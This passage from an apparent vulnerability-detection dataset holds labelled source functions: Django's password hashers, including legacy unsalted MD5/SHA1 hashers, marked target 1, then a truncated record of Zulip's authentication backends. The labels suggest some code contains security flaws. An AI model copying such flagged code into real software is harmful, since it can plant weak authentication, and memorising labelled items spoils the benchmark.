BasePasswordHasher must provide an encode() method')\n\n    def safe_summary(self, encoded):\n        \"\"\"\n        Returns a summary of safe values\n\n        The result is a dictionary and will be used where the password field\n        must be displayed to construct a safe representation of the password.\n        \"\"\"\n        raise NotImplementedError('subclasses of BasePasswordHasher must provide a safe_summary() method')\n\n    def must_update(self, encoded):\n        return False\n\n\nclass PBKDF2PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    Secure password hashing using the PBKDF2 algorithm (recommended)\n\n    Configured to use PBKDF2 + HMAC + SHA256.\n    The result is a 64 byte binary string.  Iterations may be changed\n    safely but you must rename the algorithm if you change SHA256.\n    \"\"\"\n    algorithm = \"pbkdf2_sha256\"\n    iterations = 30000\n    digest = hashlib.sha256\n\n    def encode(self, password, salt, iterations=None):\n        assert password is not None\n        assert salt and '$' not in salt\n        if not iterations:\n            iterations = self.iterations\n        hash = pbkdf2(password, salt, iterations, digest=self.digest)\n        hash = base64.b64encode(hash).decode('ascii').strip()\n        return \"%s$%d$%s$%s\" % (self.algorithm, iterations, salt, hash)\n\n    def verify(self, password, encoded):\n        algorithm, iterations, salt, hash = encoded.split('$', 3)\n        assert algorithm == self.algorithm\n        encoded_2 = self.encode(password, salt, int(iterations))\n        return constant_time_compare(encoded, encoded_2)\n\n    def safe_summary(self, encoded):\n        algorithm, iterations, salt, hash = encoded.split('$', 3)\n        assert algorithm == self.algorithm\n        return OrderedDict([\n            (_('algorithm'), algorithm),\n            (_('iterations'), iterations),\n            (_('salt'), mask_hash(salt)),\n            (_('hash'), mask_hash(hash)),\n        ])\n\n    def must_update(self, encoded):\n        algorithm, iterations, salt, hash = encoded.split('$', 3)\n        return int(iterations) != self.iterations\n\n\nclass PBKDF2SHA1PasswordHasher(PBKDF2PasswordHasher):\n    \"\"\"\n    Alternate PBKDF2 hasher which uses SHA1, the default PRF\n    recommended by PKCS #5. This is compatible with other\n    implementations of PBKDF2, such as openssl's\n    PKCS5_PBKDF2_HMAC_SHA1().\n    \"\"\"\n    algorithm = \"pbkdf2_sha1\"\n    digest = hashlib.sha1\n\n\nclass BCryptSHA256PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    Secure password hashing using the bcrypt algorithm (recommended)\n\n    This is considered by many to be the most secure algorithm but you\n    must first install the bcrypt library.  Please be warned that\n    this library depends on native C code and might cause portability\n    issues.\n    \"\"\"\n    algorithm = \"bcrypt_sha256\"\n    digest = hashlib.sha256\n    library = (\"bcrypt\", \"bcrypt\")\n    rounds = 12\n\n    def salt(self):\n        bcrypt = self._load_library()\n        return bcrypt.gensalt(self.rounds)\n\n    def encode(self, password, salt):\n        bcrypt = self._load_library()\n        # Hash the password prior to using bcrypt to prevent password\n        # truncation as described in #20138.\n        if self.digest is not None:\n            # Use binascii.hexlify() because a hex encoded bytestring is\n            # Unicode on Python 3.\n            password = binascii.hexlify(self.digest(force_bytes(password)).digest())\n        else:\n            password = force_bytes(password)\n\n        data = bcrypt.hashpw(password, salt)\n        return \"%s$%s\" % (self.algorithm, force_text(data))\n\n    def verify(self, password, encoded):\n        algorithm, data = encoded.split('$', 1)\n        assert algorithm == self.algorithm\n        bcrypt = self._load_library()\n\n        # Hash the password prior to using bcrypt to prevent password\n        # truncation as described in #20138.\n        if self.digest is not None:\n            # Use binascii.hexlify() because a hex encoded bytestring is\n            # Unicode on Python 3.\n            password = binascii.hexlify(self.digest(force_bytes(password)).digest())\n        else:\n            password = force_bytes(password)\n\n        # Ensure that our data is a bytestring\n        data = force_bytes(data)\n        # force_bytes() necessary for py-bcrypt compatibility\n        hashpw = force_bytes(bcrypt.hashpw(password, data))\n\n        return constant_time_compare(data, hashpw)\n\n    def safe_summary(self, encoded):\n        algorithm, empty, algostr, work_factor, data = encoded.split('$', 4)\n        assert algorithm == self.algorithm\n        salt, checksum = data[:22], data[22:]\n        return OrderedDict([\n            (_('algorithm'), algorithm),\n            (_('work factor'), work_factor),\n            (_('salt'), mask_hash(salt)),\n            (_('checksum'), mask_hash(checksum)),\n        ])\n\n    def must_update(self, encoded):\n        algorithm, empty, algostr, rounds, data = encoded.split('$', 4)\n        return int(rounds) != self.rounds\n\n\nclass BCryptPasswordHasher(BCryptSHA256PasswordHasher):\n    \"\"\"\n    Secure password hashing using the bcrypt algorithm\n\n    This is considered by many to be the most secure algorithm but you\n    must first install the bcrypt library.  Please be warned that\n    this library depends on native C code and might cause portability\n    issues.\n\n    This hasher does not first hash the password which means it is subject to\n    the 72 character bcrypt password truncation, most use cases should prefer\n    the BCryptSHA256PasswordHasher.\n\n    See: https://code.djangoproject.com/ticket/20138\n    \"\"\"\n    algorithm = \"bcrypt\"\n    digest = None\n\n\nclass SHA1PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    The SHA1 password hashing algorithm (not recommended)\n    \"\"\"\n    algorithm = \"sha1\"\n\n    def encode(self, password, salt):\n        assert password is not None\n        assert salt and '$' not in salt\n        hash = hashlib.sha1(force_bytes(salt + password)).hexdigest()\n        return \"%s$%s$%s\" % (self.algorithm, salt, hash)\n\n    def verify(self, password, encoded):\n        algorithm, salt, hash = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        encoded_2 = self.encode(password, salt)\n        return constant_time_compare(encoded, encoded_2)\n\n    def safe_summary(self, encoded):\n        algorithm, salt, hash = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        return OrderedDict([\n            (_('algorithm'), algorithm),\n            (_('salt'), mask_hash(salt, show=2)),\n            (_('hash'), mask_hash(hash)),\n        ])\n\n\nclass MD5PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    The Salted MD5 password hashing algorithm (not recommended)\n    \"\"\"\n    algorithm = \"md5\"\n\n    def encode(self, password, salt):\n        assert password is not None\n        assert salt and '$' not in salt\n        hash = hashlib.md5(force_bytes(salt + password)).hexdigest()\n        return \"%s$%s$%s\" % (self.algorithm, salt, hash)\n\n    def verify(self, password, encoded):\n        algorithm, salt, hash = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        encoded_2 = self.encode(password, salt)\n        return constant_time_compare(encoded, encoded_2)\n\n    def safe_summary(self, encoded):\n        algorithm, salt, hash = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        return OrderedDict([\n            (_('algorithm'), algorithm),\n            (_('salt'), mask_hash(salt, show=2)),\n            (_('hash'), mask_hash(hash)),\n        ])\n\n\nclass UnsaltedSHA1PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    Very insecure algorithm that you should *never* use; stores SHA1 hashes\n    with an empty salt.\n\n    This class is implemented because Django used to accept such password\n    hashes. Some older Django installs still have these values lingering\n    around so we need to handle and upgrade them properly.\n    \"\"\"\n    algorithm = \"unsalted_sha1\"\n\n    def salt(self):\n        return ''\n\n    def encode(self, password, salt):\n        assert salt == ''\n        hash = hashlib.sha1(force_bytes(password)).hexdigest()\n        return 'sha1$$%s' % hash\n\n    def verify(self, password, encoded):\n        encoded_2 = self.encode(password, '')\n        return constant_time_compare(encoded, encoded_2)\n\n    def safe_summary(self, encoded):\n        assert encoded.startswith('sha1$$')\n        hash = encoded[6:]\n        return OrderedDict([\n            (_('algorithm'), self.algorithm),\n            (_('hash'), mask_hash(hash)),\n        ])\n\n\nclass UnsaltedMD5PasswordHasher(BasePasswordHasher):\n    \"\"\"\n    Incredibly insecure algorithm that you should *never* use; stores unsalted\n    MD5 hashes without the algorithm prefix, also accepts MD5 hashes with an\n    empty salt.\n\n    This class is implemented because Django used to store passwords this way\n    and to accept such password hashes. Some older Django installs still have\n    these values lingering around so we need to handle and upgrade them\n    properly.\n    \"\"\"\n    algorithm = \"unsalted_md5\"\n\n    def salt(self):\n        return ''\n\n    def encode(self, password, salt):\n        assert salt == ''\n        return hashlib.md5(force_bytes(password)).hexdigest()\n\n    def verify(self, password, encoded):\n        if len(encoded) == 37 and encoded.startswith('md5$$'):\n            encoded = encoded[5:]\n        encoded_2 = self.encode(password, '')\n        return constant_time_compare(encoded, encoded_2)\n\n    def safe_summary(self, encoded):\n        return OrderedDict([\n            (_('algorithm'), self.algorithm),\n            (_('hash'), mask_hash(encoded, show=3)),\n        ])\n\n\nclass CryptPasswordHasher(BasePasswordHasher):\n    \"\"\"\n    Password hashing using UNIX crypt (not recommended)\n\n    The crypt module is not supported on all platforms.\n    \"\"\"\n    algorithm = \"crypt\"\n    library = \"crypt\"\n\n    def salt(self):\n        return get_random_string(2)\n\n    def encode(self, password, salt):\n        crypt = self._load_library()\n        assert len(salt) == 2\n        data = crypt.crypt(force_str(password), salt)\n        # we don't need to store the salt, but Django used to do this\n        return \"%s$%s$%s\" % (self.algorithm, '', data)\n\n    def verify(self, password, encoded):\n        crypt = self._load_library()\n        algorithm, salt, data = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        return constant_time_compare(data, crypt.crypt(force_str(password), data))\n\n    def safe_summary(self, encoded):\n        algorithm, salt, data = encoded.split('$', 2)\n        assert algorithm == self.algorithm\n        return OrderedDict([\n            (_('algorithm'), algorithm),\n            (_('salt'), salt),\n            (_('hash'), mask_hash(data, show=3)),\n        ])\n", "target": 1}
{"idx": 1020, "func": "# Documentation for Zulip's authentication backends is split across a few places:\n#\n# * https://zulip.readthedocs.io/en/latest/production/authentication-methods.html and\n#   zproject/prod_settings_template.py have user-level configuration documentation.\n# * https://zulip.readthedocs.io/en/latest/development/authentication.html\n#   has developer-level documentation, especially on testing authentication backends\n#   in the Zulip development environment.\n#\n# Django upstream's documentation for authentication backends is also\n# helpful background.  The most important detail to understand for\n# reading this file is that the Django authenticate() function will\n# call the authenticate methods of all backends registered in\n# settings.AUTHENTICATION_BACKENDS that have a function signature\n# matching the args/kwargs passed in the authenticate() call.\nimport copy\nimport logging\nimport magic\nimport ujson\nfrom typing import Any, Dict, List, Optional, Set, Tuple, Union\nfrom typing_extensions import TypedDict\n\nfrom django_auth_ldap.backend import LDAPBackend, LDAPReverseEmailSearch, \\\n    _LDAPUser, ldap_error\nfrom django.contrib.auth import get_backends\nfrom django.contrib.auth.backends import RemoteUserBackend\nfrom django.conf import settings\nfrom django.core.exceptions import ValidationError\nfrom django.core.validators import validate_email\nfrom django.dispatch import receiver, Signal\nfrom django.http import HttpResponse, HttpResponseRedirect\nfrom django.shortcuts import render\nfrom django.urls import reverse\nfrom requests import HTTPError\nfrom onelogin.saml2.errors import OneLogin_Saml2_Error\nfrom social_core.backends.github import GithubOAuth2, GithubOrganizationOAuth2, \\\n    GithubTeamOAuth2\nfrom social_core.backends.azuread import AzureADOAuth2\nfrom social_core.backends.base import BaseAuth\nfrom social_core.backends.google import GoogleOAuth2\nfrom social_core.backends.oauth import BaseOAuth2\nfrom social_core.backends.saml import SAMLAuth\nfrom social_core.pipeline.partial import partial\nfrom social_core.exceptions import AuthFailed, SocialAuthBaseException\n\nfrom zerver.lib.actions import do_create_user, do_reactivate_user, do_deactivate_user, \\\n    do_update_user_custom_profile_data_if_changed, validate_email_for_realm\nfrom zerver.lib.avatar import is_avatar_new, avatar_url\nfrom zerver.lib.avatar_hash import user_avatar_content_hash\nfrom zerver.lib.dev_ldap_directory import init_fakeldap\nfrom zerver.lib.request import JsonableError\nfrom zerver.lib.users import check_full_name, validate_user_custom_profile_field\nfrom zerver.lib.utils import generate_random_token\nfrom zerver.lib.redis_utils import get_redis_client\nfrom zerver.models import CustomProfileField, DisposableEmailError, DomainNotAllowedForRealmError, \\\n    EmailContainsPlusError, PreregistrationUser, UserProfile, Realm, custom_profile_fields_for_realm, \\\n    email_allowed_for_realm, get_default_stream_groups, get_user_profile_by_id, remote_user_to_email, \\\n    email_to_username, get_realm, get_user_by_delivery_email, supported_auth_backends\n\nredis_client = get_redis_client()\n\n# This first batch of methods is used by other code in Zulip to check\n# whether a given authentication backend is enabled for a given realm.\n# In each case, we both needs to check at the server level (via\n# `settings.AUTHENTICATION_BACKENDS`, queried via\n# `django.contrib.auth.get_backends`) and at the realm level (via the\n# `Realm.authentication_methods` BitField).\ndef pad_method_dict(method_dict: Dict[str, bool]) -> Dict[str, bool]:\n    \"\"\"Pads an authentication methods dict to contain all auth backends\n    supported by the software, regardless of whether they are\n    configured on this server\"\"\"\n    for key in AUTH_BACKEND_NAME_MAP:\n        if key not in method_dict:\n            method_dict[key] = False\n    return method_dict\n\ndef auth_enabled_helper(backends_to_check: List[str], realm: Optional[Realm]) -> bool:\n    if realm is not None:\n        enabled_method_dict = realm.authentication_methods_dict()\n        pad_method_dict(enabled_method_dict)\n    else:\n        enabled_method_dict = dict((method, True) for method in Realm.AUTHENTICATION_FLAGS)\n        pad_method_dict(enabled_method_dict)\n    for supported_backend in supported_auth_backends():\n        for backend_name in backends_to_check:\n            backend = AUTH_BACKEND_NAME_MAP[backend_name]\n            if enabled_method_dict[backend_name] and isinstance(supported_backend, backend):\n                return True\n    return False\n\ndef ldap_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['LDAP'], realm)\n\ndef email_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['Email'], realm)\n\ndef password_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return ldap_auth_enabled(realm) or email_auth_enabled(realm)\n\ndef dev_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['Dev'], realm)\n\ndef google_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['Google'], realm)\n\ndef github_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['GitHub'], realm)\n\ndef saml_auth_enabled(realm: Optional[Realm]=None) -> bool:\n    return auth_enabled_helper(['SAML'], realm)\n\ndef any_social_backend_enabled(realm: Optional[Realm]=None) -> bool:\n    \"\"\"Used by the login page process to determine whether to show the\n    'OR' for login with Google\"\"\"\n    social_backend_names = [social_auth_subclass.auth_backend_name\n                            for social_auth_subclass in SOCIAL_AUTH_BACKENDS]\n    return auth_enabled_helper(social_backend_names, realm)\n\ndef redirect_to_config_error(error_type: str) -> HttpResponseRedirect:\n    return HttpResponseRedirect(\"/config-error/%s\" % (error_type,))\n\ndef require_email_format_usernames(realm: Optional[Realm]=None) -> bool:\n    if ldap_auth_enabled(realm):\n        if settings.LDAP_EMAIL_ATTR or settings.LDAP_APPEND_DOMAIN:\n            return False\n    return True\n\ndef is_user_active(user_profile: UserProfile, return_data: Optional[Dict[str, Any]]=None) -> bool:\n    if not user_profile.is_active:\n        if return_data is not None:\n            if user_profile.is_mirror_dummy:\n                # Record whether it's a mirror dummy account\n                return_data['is_mirror_dummy'] = True\n            return_data['inactive_user'] = True\n        return False\n    if user_profile.realm.deactivated:\n        if return_data is not None:\n            return_data['inactive_realm'] = True\n        return False\n\n    return True\n\ndef common_get_active_user(email: str, realm: Realm,\n                           return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n    \"\"\"This is the core common function used by essentially all\n    authentication backends to check if there's an active user account\n    with a given email address in the organization, handling both\n    user-level and realm-level deactivation correctly.\n    \"\"\"\n    try:\n        user_profile = get_user_by_delivery_email(email, realm)\n    except UserProfile.DoesNotExist:\n        # If the user doesn't have an account in the target realm, we\n        # check whether they might have an account in another realm,\n        # and if so, provide a helpful error message via\n        # `invalid_subdomain`.\n        if not UserProfile.objects.filter(delivery_email__iexact=email).exists():\n            return None\n        if return_data is not None:\n            return_data['invalid_subdomain'] = True\n        return None\n    if not is_user_active(user_profile, return_data):\n        return None\n\n    return user_profile\n\nclass ZulipAuthMixin:\n    \"\"\"This common mixin is used to override Django's default behavior for\n    looking up a logged-in user by ID to use a version that fetches\n    from memcached before checking the database (avoiding a database\n    query in most cases).\n    \"\"\"\n    def get_user(self, user_profile_id: int) -> Optional[UserProfile]:\n        \"\"\"Override the Django method for getting a UserProfile object from\n        the user_profile_id,.\"\"\"\n        try:\n            return get_user_profile_by_id(user_profile_id)\n        except UserProfile.DoesNotExist:\n            return None\n\nclass ZulipDummyBackend(ZulipAuthMixin):\n    \"\"\"Used when we want to log you in without checking any\n    authentication (i.e. new user registration or when otherwise\n    authentication has already been checked earlier in the process).\n\n    We ensure that this backend only ever successfully authenticates\n    when explicitly requested by including the use_dummy_backend kwarg.\n    \"\"\"\n\n    def authenticate(self, *, username: str, realm: Realm,\n                     use_dummy_backend: bool=False,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        if use_dummy_backend:\n            return common_get_active_user(username, realm, return_data)\n        return None\n\nclass EmailAuthBackend(ZulipAuthMixin):\n    \"\"\"\n    Email+Password Authentication Backend (the default).\n\n    Allows a user to sign in using an email/password pair.\n    \"\"\"\n\n    def authenticate(self, *, username: str, password: str,\n                     realm: Realm,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        \"\"\" Authenticate a user based on email address as the user name. \"\"\"\n        if not password_auth_enabled(realm):\n            if return_data is not None:\n                return_data['password_auth_disabled'] = True\n            return None\n        if not email_auth_enabled(realm):\n            if return_data is not None:\n                return_data['email_auth_disabled'] = True\n            return None\n\n        user_profile = common_get_active_user(username, realm, return_data=return_data)\n        if user_profile is None:\n            return None\n        if user_profile.check_password(password):\n            return user_profile\n        return None\n\nclass ZulipRemoteUserBackend(RemoteUserBackend):\n    \"\"\"Authentication backend that reads the Apache REMOTE_USER variable.\n    Used primarily in enterprise environments with an SSO solution\n    that has an Apache REMOTE_USER integration.  For manual testing, see\n\n      https://zulip.readthedocs.io/en/latest/production/authentication-methods.html\n\n    See also remote_user_sso in zerver/views/auth.py.\n    \"\"\"\n    create_unknown_user = False\n\n    def authenticate(self, *, remote_user: str, realm: Realm,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        if not auth_enabled_helper([\"RemoteUser\"], realm):\n            return None\n\n        email = remote_user_to_email(remote_user)\n        return common_get_active_user(email, realm, return_data=return_data)\n\ndef is_valid_email(email: str) -> bool:\n    try:\n        validate_email(email)\n    except ValidationError:\n        return False\n    return True\n\ndef check_ldap_config() -> None:\n    if not settings.LDAP_APPEND_DOMAIN:\n        # Email search needs to be configured in this case.\n        assert settings.AUTH_LDAP_USERNAME_ATTR and settings.AUTH_LDAP_REVERSE_EMAIL_SEARCH\n\ndef find_ldap_users_by_email(email: str) -> Optional[List[_LDAPUser]]:\n    \"\"\"\n    Returns list of _LDAPUsers matching the email search,\n    or None if no matches are found.\n    \"\"\"\n    email_search = LDAPReverseEmailSearch(LDAPBackend(), email)\n    return email_search.search_for_users(should_populate=False)\n\ndef email_belongs_to_ldap(realm: Realm, email: str) -> bool:\n    \"\"\"Used to make determinations on whether a user's email address is\n    managed by LDAP.  For environments using both LDAP and\n    Email+Password authentication, we do not allow EmailAuthBackend\n    authentication for email addresses managed by LDAP (to avoid a\n    security issue where one create separate credentials for an LDAP\n    user), and this function is used to enforce that rule.\n    \"\"\"\n    if not ldap_auth_enabled(realm):\n        return False\n\n    check_ldap_config()\n    if settings.LDAP_APPEND_DOMAIN:\n        # Check if the email ends with LDAP_APPEND_DOMAIN\n        return email.strip().lower().endswith(\"@\" + settings.LDAP_APPEND_DOMAIN)\n\n    # If we don't have an LDAP domain, we have to do a lookup for the email.\n    if find_ldap_users_by_email(email):\n        return True\n    else:\n        return False\n\n\nclass ZulipLDAPException(_LDAPUser.AuthenticationFailed):\n    \"\"\"Since this inherits from _LDAPUser.AuthenticationFailed, these will\n    be caught and logged at debug level inside django-auth-ldap's authenticate()\"\"\"\n    pass\n\nclass ZulipLDAPExceptionNoMatchingLDAPUser(ZulipLDAPException):\n    pass\n\nclass ZulipLDAPExceptionOutsideDomain(ZulipLDAPExceptionNoMatchingLDAPUser):\n    pass\n\nclass ZulipLDAPConfigurationError(Exception):\n    pass\n\nLDAP_USER_ACCOUNT_CONTROL_DISABLED_MASK = 2\n\nclass ZulipLDAPAuthBackendBase(ZulipAuthMixin, LDAPBackend):\n    \"\"\"Common code between LDAP authentication (ZulipLDAPAuthBackend) and\n    using LDAP just to sync user data (ZulipLDAPUserPopulator).\n\n    To fully understand our LDAP backend, you may want to skim\n    django_auth_ldap/backend.py from the upstream django-auth-ldap\n    library.  It's not a lot of code, and searching around in that\n    file makes the flow for LDAP authentication clear.\n    \"\"\"\n    def __init__(self) -> None:\n        # Used to initialize a fake LDAP directly for both manual\n        # and automated testing in a development environment where\n        # there is no actual LDAP server.\n        if settings.DEVELOPMENT and settings.FAKE_LDAP_MODE:  # nocoverage\n            init_fakeldap()\n\n        check_ldap_config()\n\n    # Disable django-auth-ldap's permissions functions -- we don't use\n    # the standard Django user/group permissions system because they\n    # are prone to performance issues.\n    def has_perm(self, user: Optional[UserProfile], perm: Any, obj: Any=None) -> bool:\n        return False\n\n    def has_module_perms(self, user: Optional[UserProfile], app_label: Optional[str]) -> bool:\n        return False\n\n    def get_all_permissions(self, user: Optional[UserProfile], obj: Any=None) -> Set[Any]:\n        return set()\n\n    def get_group_permissions(self, user: Optional[UserProfile], obj: Any=None) -> Set[Any]:\n        return set()\n\n    def django_to_ldap_username(self, username: str) -> str:\n        \"\"\"\n        Translates django username (user_profile.email or whatever the user typed in the login\n        field when authenticating via the ldap backend) into ldap username.\n        Guarantees that the username it returns actually has an entry in the ldap directory.\n        Raises ZulipLDAPExceptionNoMatchingLDAPUser if that's not possible.\n        \"\"\"\n        result = username\n        if settings.LDAP_APPEND_DOMAIN:\n            if is_valid_email(username):\n                if not username.endswith(\"@\" + settings.LDAP_APPEND_DOMAIN):\n                    raise ZulipLDAPExceptionOutsideDomain(\"Email %s does not match LDAP domain %s.\" % (\n                        username, settings.LDAP_APPEND_DOMAIN))\n                result = email_to_username(username)\n        else:\n            # We can use find_ldap_users_by_email\n            if is_valid_email(username):\n                email_search_result = find_ldap_users_by_email(username)\n                if email_search_result is None:\n                    result = username\n                elif len(email_search_result) == 1:\n                    return email_search_result[0]._username\n                elif len(email_search_result) > 1:\n                    # This is possible, but strange, so worth logging a warning about.\n                    # We can't translate the email to a unique username,\n                    # so we don't do anything else here.\n                    logging.warning(\"Multiple users with email {} found in LDAP.\".format(username))\n                    result = username\n\n        if _LDAPUser(self, result).attrs is None:\n            # Check that there actually is an ldap entry matching the result username\n            # we want to return. Otherwise, raise an exception.\n            raise ZulipLDAPExceptionNoMatchingLDAPUser()\n\n        return result\n\n    def user_email_from_ldapuser(self, username: str, ldap_user: _LDAPUser) -> str:\n        if hasattr(ldap_user, '_username'):\n            # In tests, we sometimes pass a simplified _LDAPUser without _username attr,\n            # and with the intended username in the username argument.\n            username = ldap_user._username\n\n        if settings.LDAP_APPEND_DOMAIN:\n            return \"@\".join((username, settings.LDAP_APPEND_DOMAIN))\n\n        if settings.LDAP_EMAIL_ATTR is not None:\n            # Get email from ldap attributes.\n            if settings.LDAP_EMAIL_ATTR not in ldap_user.attrs:\n                raise ZulipLDAPException(\"LDAP user doesn't have the needed %s attribute\" % (\n                    settings.LDAP_EMAIL_ATTR,))\n            else:\n                return ldap_user.attrs[settings.LDAP_EMAIL_ATTR][0]\n\n        return username\n\n    def ldap_to_django_username(self, username: str) -> str:\n        \"\"\"\n        This is called inside django_auth_ldap with only one role:\n        to convert _LDAPUser._username to django username (so in Zulip, the email)\n        and pass that as \"username\" argument to get_or_build_user(username, ldapuser).\n        In many cases, the email is stored in the _LDAPUser's attributes, so it can't be\n        constructed just from the username. We choose to do nothing in this function,\n        and our overrides of get_or_build_user() obtain that username from the _LDAPUser\n        object on their own, through our user_email_from_ldapuser function.\n        \"\"\"\n        return username\n\n    def sync_avatar_from_ldap(self, user: UserProfile, ldap_user: _LDAPUser) -> None:\n        if 'avatar' in settings.AUTH_LDAP_USER_ATTR_MAP:\n            # We do local imports here to avoid import loops\n            from zerver.lib.upload import upload_avatar_image\n            from zerver.lib.actions import do_change_avatar_fields\n            from io import BytesIO\n\n            avatar_attr_name = settings.AUTH_LDAP_USER_ATTR_MAP['avatar']\n            if avatar_attr_name not in ldap_user.attrs:  # nocoverage\n                # If this specific user doesn't have e.g. a\n                # thumbnailPhoto set in LDAP, just skip that user.\n                return\n\n            ldap_avatar = ldap_user.attrs[avatar_attr_name][0]\n\n            avatar_changed = is_avatar_new(ldap_avatar, user)\n            if not avatar_changed:\n                # Don't do work to replace the avatar with itself.\n                return\n\n            io = BytesIO(ldap_avatar)\n            # Structurally, to make the S3 backend happy, we need to\n            # provide a Content-Type; since that isn't specified in\n            # any metadata, we auto-detect it.\n            content_type = magic.from_buffer(copy.deepcopy(io).read()[0:1024], mime=True)\n            if content_type.startswith(\"image/\"):\n                upload_avatar_image(io, user, user, content_type=content_type)\n                do_change_avatar_fields(user, UserProfile.AVATAR_FROM_USER)\n                # Update avatar hash.\n                user.avatar_hash = user_avatar_content_hash(ldap_avatar)\n                user.save(update_fields=[\"avatar_hash\"])\n            else:\n                logging.warning(\"Could not parse %s field for user %s\" %\n                                (avatar_attr_name, user.id))\n\n    def is_account_control_disabled_user(self, ldap_user: _LDAPUser) -> bool:\n        \"\"\"Implements the userAccountControl check for whether a user has been\n        disabled in an Active Directory server being integrated with\n        Zulip via LDAP.\"\"\"\n        account_control_value = ldap_user.attrs[settings.AUTH_LDAP_USER_ATTR_MAP['userAccountControl']][0]\n        ldap_disabled = bool(int(account_control_value) & LDAP_USER_ACCOUNT_CONTROL_DISABLED_MASK)\n        return ldap_disabled\n\n    @classmethod\n    def get_mapped_name(cls, ldap_user: _LDAPUser) -> Tuple[str, str]:\n        \"\"\"Constructs the user's Zulip full_name and short_name fields from\n        the LDAP data\"\"\"\n        if \"full_name\" in settings.AUTH_LDAP_USER_ATTR_MAP:\n            full_name_attr = settings.AUTH_LDAP_USER_ATTR_MAP[\"full_name\"]\n            short_name = full_name = ldap_user.attrs[full_name_attr][0]\n        elif all(key in settings.AUTH_LDAP_USER_ATTR_MAP for key in {\"first_name\", \"last_name\"}):\n            first_name_attr = settings.AUTH_LDAP_USER_ATTR_MAP[\"first_name\"]\n            last_name_attr = settings.AUTH_LDAP_USER_ATTR_MAP[\"last_name\"]\n            short_name = ldap_user.attrs[first_name_attr][0]\n            full_name = short_name + ' ' + ldap_user.attrs[last_name_attr][0]\n        else:\n            raise ZulipLDAPException(\"Missing required mapping for user's full name\")\n\n        if \"short_name\" in settings.AUTH_LDAP_USER_ATTR_MAP:\n            short_name_attr = settings.AUTH_LDAP_USER_ATTR_MAP[\"short_name\"]\n            short_name = ldap_user.attrs[short_name_attr][0]\n\n        return full_name, short_name\n\n    def sync_full_name_from_ldap(self, user_profile: UserProfile,\n                                 ldap_user: _LDAPUser) -> None:\n        from zerver.lib.actions import do_change_full_name\n        full_name, _ = self.get_mapped_name(ldap_user)\n        if full_name != user_profile.full_name:\n            try:\n                full_name = check_full_name(full_name)\n            except JsonableError as e:\n                raise ZulipLDAPException(e.msg)\n            do_change_full_name(user_profile, full_name, None)\n\n    def sync_custom_profile_fields_from_ldap(self, user_profile: UserProfile,\n                                             ldap_user: _LDAPUser) -> None:\n        values_by_var_name = {}   # type: Dict[str, Union[int, str, List[int]]]\n        for attr, ldap_attr in settings.AUTH_LDAP_USER_ATTR_MAP.items():\n            if not attr.startswith('custom_profile_field__'):\n                continue\n            var_name = attr.split('custom_profile_field__')[1]\n            try:\n                value = ldap_user.attrs[ldap_attr][0]\n            except KeyError:\n                # If this user doesn't have this field set then ignore this\n                # field and continue syncing other fields. `django-auth-ldap`\n                # automatically logs error about missing field.\n                continue\n            values_by_var_name[var_name] = value\n\n        fields_by_var_name = {}   # type: Dict[str, CustomProfileField]\n        custom_profile_fields = custom_profile_fields_for_realm(user_profile.realm.id)\n        for field in custom_profile_fields:\n            var_name = '_'.join(field.name.lower().split(' '))\n            fields_by_var_name[var_name] = field\n\n        existing_values = {}\n        for data in user_profile.profile_data:\n            var_name = '_'.join(data['name'].lower().split(' '))\n            existing_values[var_name] = data['value']\n\n        profile_data = []   # type: List[Dict[str, Union[int, str, List[int]]]]\n        for var_name, value in values_by_var_name.items():\n            try:\n                field = fields_by_var_name[var_name]\n            except KeyError:\n                raise ZulipLDAPException('Custom profile field with name %s not found.' % (var_name,))\n            if existing_values.get(var_name) == value:\n                continue\n            result = validate_user_custom_profile_field(user_profile.realm.id, field, value)\n            if result is not None:\n                raise ZulipLDAPException('Invalid data for %s field: %s' % (var_name, result))\n            profile_data.append({\n                'id': field.id,\n                'value': value,\n            })\n        do_update_user_custom_profile_data_if_changed(user_profile, profile_data)\n\nclass ZulipLDAPAuthBackend(ZulipLDAPAuthBackendBase):\n    REALM_IS_NONE_ERROR = 1\n\n    def authenticate(self, *, username: str, password: str, realm: Realm,\n                     prereg_user: Optional[PreregistrationUser]=None,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        self._realm = realm\n        self._prereg_user = prereg_user\n        if not ldap_auth_enabled(realm):\n            return None\n\n        try:\n            # We want to apss the user's LDAP username into\n            # authenticate() below.  If an email address was entered\n            # in the login form, we need to use\n            # django_to_ldap_username to translate the email address\n            # to the user's LDAP username before calling the\n            # django-auth-ldap authenticate().\n            username = self.django_to_ldap_username(username)\n        except ZulipLDAPExceptionNoMatchingLDAPUser:\n            if return_data is not None:\n                return_data['no_matching_ldap_user'] = True\n            return None\n\n        # Call into (ultimately) the django-auth-ldap authenticate\n        # function.  This will check the username/password pair\n        # against the LDAP database, and assuming those are correct,\n        # end up calling `self.get_or_build_user` with the\n        # authenticated user's data from LDAP.\n        return ZulipLDAPAuthBackendBase.authenticate(self,\n                                                     request=None,\n                                                     username=username,\n                                                     password=password)\n\n    def get_or_build_user(self, username: str, ldap_user: _LDAPUser) -> Tuple[UserProfile, bool]:\n        \"\"\"The main function of our authentication backend extension of\n        django-auth-ldap.  When this is called (from `authenticate`),\n        django-auth-ldap will already have verified that the provided\n        username and password match those in the LDAP database.\n\n        This function's responsibility is to check 